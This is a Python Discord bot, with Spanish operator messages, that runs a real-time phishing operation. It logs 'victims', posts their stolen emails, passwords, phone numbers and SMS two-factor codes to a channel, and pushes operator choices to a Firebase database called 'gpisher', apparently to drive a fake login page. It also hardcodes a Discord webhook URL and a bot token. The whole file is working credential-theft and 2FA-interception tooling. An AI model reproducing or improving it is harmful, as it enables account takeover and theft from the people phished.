import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1534852386202325033/0jjzhnwRBcvvd-RNmYbKAw2Q98Oai1cX9rP1Wv-0wbpmmdMNfuU3CO29fu6I4ZviLtyN"
FIREBASE_URL = "https://gpisher-85cb8-default-rtdb.firebaseio.com"

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
pending_sessions = {}
last_session_id = None

async def send_firebase(session_id, decision):
    url = f"{FIREBASE_URL}/decisions/{session_id}.json"
    data = {"decision": decision, "timestamp": datetime.now().isoformat()}
    async with aiohttp.ClientSession() as session:
        async with session.put(url, json=data) as resp:
            return resp.status == 200

async def clear_firebase(session_id):
    url = f"{FIREBASE_URL}/decisions/{session_id}.json"
    async with aiohttp.ClientSession() as session:
        async with session.put(url, json=None) as resp:
            return resp.status == 200

def extract_session_id(message):
    if message.embeds:
        for embed in message.embeds:
            for field in embed.fields:
                if field.name.lower() in ("session", "🆔 session"):
                    return field.value.strip().strip("`")
    import re
    match = re.search(r'Session[:\s]+`?([A-Z0-9]+)`?', message.content)
    if match:
        return match.group(1)
    return None

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")
    print("Esperando mensajes de victima en Discord...")
    print("Escribe 1 o 2 como reply al mensaje de la victima")

@bot.event
async def on_message(message):
    if message.author.bot and message.author.id != bot.user.id:
        session_id = extract_session_id(message)
        if session_id:
            pending_sessions[session_id] = {
                "message_id": message.id,
                "channel_id": message.channel.id,
                "timestamp": datetime.now().isoformat()
            }
            global last_session_id
            last_session_id = session_id
            print(f"[+] Victima detectada - Session: {session_id}")
        await bot.process_commands(message)
        return

    if message.author == bot.user:
        await bot.process_commands(message)
        return

    content = message.content.strip()
    session_id = None

    if message.reference and message.reference.message_id:
        try:
            ref_msg = await message.channel.fetch_message(message.reference.message_id)
            session_id = extract_session_id(ref_msg)
        except:
            pass

    if not session_id and last_session_id:
        session_id = last_session_id

    if content in ("1", "2") and session_id:
        if session_id in pending_sessions:
            data = pending_sessions[session_id]
        else:
            data = {}

        if content == "1":
            await send_firebase(session_id, "1")
            await message.add_reaction("✅")
            await message.reply(f"`{session_id}` → 2FA activado. Esperando numero y codigo.")
            pending_sessions[session_id] = {
                **data,
                "status": "waiting_phone",
                "channel": message.channel
            }
        elif content == "2":
            await send_firebase(session_id, "2")
            await message.add_reaction("🚀")
            await message.reply(f"`{session_id}` → Redirigiendo a Google.")
            if session_id in pending_sessions:
                del pending_sessions[session_id]
        return

    await bot.process_commands(message)

@bot.command()
async def victima(ctx, email: str, password: str, session_id: str):
    await ctx.send(f"**Nueva Victima: `{email}`**\n🔑 ||{password}||\n🆔 `{session_id}`\n\nEscribe `1` para 2FA o `2` para redirigir")
    pending_sessions[session_id] = {"email": email, "password": password, "status": "waiting", "channel": ctx.channel}

@bot.command()
async def numero(ctx, session_id: str, *, numero: str):
    if session_id not in pending_sessions:
        await ctx.send("Session no encontrada")
        return
    data = pending_sessions[session_id]
    data["phone"] = numero
    data["status"] = "waiting_sms"
    embed = discord.Embed(title="NUMERO RECIBIDO", color=0xff0000, timestamp=datetime.now())
    embed.add_field(name="Email", value=data["email"], inline=False)
    embed.add_field(name="Password", value=f"||{data['password']}||", inline=False)
    embed.add_field(name="Telefono", value=numero, inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def codigo(ctx, session_id: str, codigo: str):
    if session_id not in pending_sessions:
        await ctx.send("Session no encontrada")
        return
    data = pending_sessions[session_id]
    phone = data.get("phone", "N/A")
    embed = discord.Embed(title="CODIGO SMS RECIBIDO", color=0x00ff00, timestamp=datetime.now())
    embed.add_field(name="Email", value=data["email"], inline=False)
    embed.add_field(name="Password", value=f"||{data['password']}||", inline=False)
    embed.add_field(name="Telefono", value=phone, inline=False)
    embed.add_field(name="Codigo SMS", value=f"||{codigo}||", inline=False)
    await ctx.send(embed=embed)
    del pending_sessions[session_id]

TOKEN = "MTUzNDg0MjA3MzI1NjI5NjQ2OA.Gl4Zri.n-TToGVG2h1vyYPvAHw7Z1gJ3saYPUWrgFe_Cs"
bot.run(TOKEN)

